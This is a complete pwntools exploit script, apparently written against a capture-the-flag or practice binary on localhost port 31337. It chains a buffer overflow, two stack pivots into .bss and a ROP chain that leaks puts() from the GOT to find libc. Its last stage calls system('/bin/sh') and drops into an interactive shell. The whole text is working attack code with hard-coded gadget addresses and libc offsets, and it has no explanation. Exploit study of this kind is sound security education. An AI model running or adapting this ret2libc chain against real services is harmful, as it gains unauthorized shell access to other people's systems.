
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST, PORT = '127.0.0.1', 31337
r = remote(HOST, PORT)

# Binary addresses
puts_got = 0x404000
puts_plt = 0x401060

pop_rdi = 0x4011db
ret = 0x40101a
leave_ret = 0x40123b
read_again = 0x401211

# Writable memory for fake stacks
bss = 0x404800
stage3 = bss + 0x100

# Libc offsets (verify against your libc)
puts_offset = 0x87be0
system_offset = 0x58750
binsh_offset = 0x1cb42f


# Stage 1: Redirect RBP into .bss
payload1 = flat(
    b'A' * 0x30,
    bss + 0x30,     # Saved RBP
    read_again      # Saved RIP
)

assert len(payload1) == 0x40
r.send(payload1)


# Stage 2: Leak puts() address
rop2 = flat(
    stage3 + 0x30,  # Fake RBP for the next read
    ret,            # Stack alignment
    pop_rdi,
    puts_got,
    puts_plt,
    read_again
)

payload2 = rop2.ljust(0x30, b'\x00')
payload2 += p64(bss)       # Pivot destination
payload2 += p64(leave_ret)

assert len(payload2) == 0x40
r.send(payload2)


# Receive libc leak
for _ in range(4):
    log.info(f"Output: {r.recvline().strip()!r}")

leak = r.recvline(keepends=False)
puts_addr = u64(leak[:6].ljust(8, b'\x00'))

libc_base = puts_addr - puts_offset

log.success(f"puts:      {hex(puts_addr)}")
log.success(f"libc base: {hex(libc_base)}")

assert libc_base & 0xfff == 0, "Invalid libc base; check leak"

system = libc_base + system_offset
binsh = libc_base + binsh_offset

log.success(f"system:    {hex(system)}")
log.success(f"/bin/sh:   {hex(binsh)}")


# Stage 3: system("/bin/sh")
rop3 = flat(
    0,          # Fake RBP
    ret,        # Stack alignment
    pop_rdi,
    binsh,
    system
)

payload3 = rop3.ljust(0x30, b'\x00')
payload3 += p64(stage3)    # Pivot into final ROP chain
payload3 += p64(leave_ret)

assert len(payload3) == 0x40
r.send(payload3)

r.interactive()
